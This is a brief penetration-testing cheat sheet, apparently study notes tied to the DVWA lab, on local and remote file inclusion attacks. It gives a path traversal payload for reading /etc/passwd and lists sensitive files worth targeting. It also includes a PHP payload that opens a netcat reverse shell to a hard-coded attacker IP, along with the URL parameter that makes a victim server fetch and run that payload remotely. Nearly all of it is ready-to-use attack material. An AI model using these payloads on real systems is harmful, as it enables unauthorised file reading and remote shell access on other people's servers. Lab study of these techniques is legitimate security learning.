# File Inclusion

## Local
- Exploit
  - Modify ```?page=include.php``` to ```?page=../../../../../etc/passwd```
- Intersting files
  - /proc/self/environ
  - /var/log/auth.log
  - /var/log/apache2/access.log  
- Example
  - [DVWA](../BuggyApp/DVWA/file-inclusion.md)  

## Remote
- Exploit
  - Save the code as *"reverse.txt"*, if extnsion be *"php"*, it will run on kali machine. ? is for run the code in victim machine
```php
<?php
passthru('nc -e /bin/sh 10.20.14.203 8080');
?>
``` 
  - Modify ```?page=include.php``` to ```?page=http://10.20.14.203/reverse.txt?```
